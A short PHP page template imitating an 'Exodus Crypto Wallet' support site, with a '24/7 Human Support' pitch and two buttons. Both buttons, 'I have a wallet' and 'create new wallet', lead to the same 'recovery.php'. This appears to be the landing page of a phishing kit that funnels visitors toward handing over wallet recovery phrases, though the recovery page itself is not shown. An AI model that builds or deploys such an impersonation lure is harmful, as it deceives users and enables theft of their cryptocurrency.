<?php include_once './config.php'; ?>
<html lang="en">
    <?php
    $title = 'Exodus Crypto Wallet';
    include_once './includes/meta.php';
    ?>
    <body>
        <?php $number=1; include_once './includes/header.php'; ?>
        <div class="container">
            <div class="row justify-content-center mt40">
                <div class="col-sm-6">
                    <h2 class="fs50 lh60 fw-normal">&nbsp;<br/>We have your back with <br/>24/7 Human Support</h2>
                    <div class="fs18 text-secondary mt15 lh28">Get Help in minutes and see why <br/>millions love us</div>
                    <div class="row mt20">
                        <div class="col-sm-12">
                            <a href="<?= base_url('recovery.php') ?>" class="btn btn-secondary btn-secondary-2 rounded-pill px45 fs13 py12">I HAVE A WALLET</a>
                            <a href="<?= base_url('recovery.php') ?>" class="btn btn-primary btn-primary-2 rounded-pill px45 fs13 py12 ms20">CREATE NEW WALLET</a>
                        </div>
                    </div>
                </div>
                <div class="col-sm-6">
                    <img src="<?= base_url('assets/img/right.png') ?>" class="img-fluid" style="max-width:100%" alt="...">
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>